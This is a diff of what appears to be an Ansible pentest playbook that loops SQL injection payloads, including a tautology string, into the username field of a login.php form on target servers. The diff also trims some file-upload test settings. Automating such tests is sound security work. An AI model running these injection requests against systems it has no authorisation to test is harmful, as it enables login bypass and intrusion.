@@ -23,36 +23,22 @@
       - "' OR (1=1 AND 2=2)--"
 
 
-    temp_directory: "/tmp"
-    output_directory: "{{ temp_directory }}/large_files"
-
-    file_sizes: 
-      - 10
-      - 20
-      - 30
-
-    form_data:
-      title: "Pentest Upload"
-      content: "Security test content"
-
-    timeout_seconds: 10
-
   tasks:    
     - name: Display SQL Injection Test Matrix
       debug:
-        msg: "Target Server: {{ item.0 }} | SQL Payload: {{ item.1 }}"
-      loop: "{{ attack_servers | product(sql_payloads) | list }}"
+        msg: "Target Server: {{ attack_servers[0] }} | SQL Payload: {{ item }}"
+      loop: "{{ sql_payloads }}"
       
     - name: Execute SQL Injection Attack Test
       uri:
-        url: "http://{{ item.0 }}/login.php"
+        url: "http://{{ attack_servers[0] }}/login.php"
         method: POST
         body_format: form-urlencoded
         body:
-          username: "{{ item.1 }}"
+          username: "{{ item }}"
           password: "test"
         status_code: [200, 403, 500]
         timeout: 5
       register: sqli_test_results
-      loop: "{{ attack_servers | product(sql_payloads) | list }}"
+      loop: "{{ sql_payloads }}"
       ignore_errors: yes
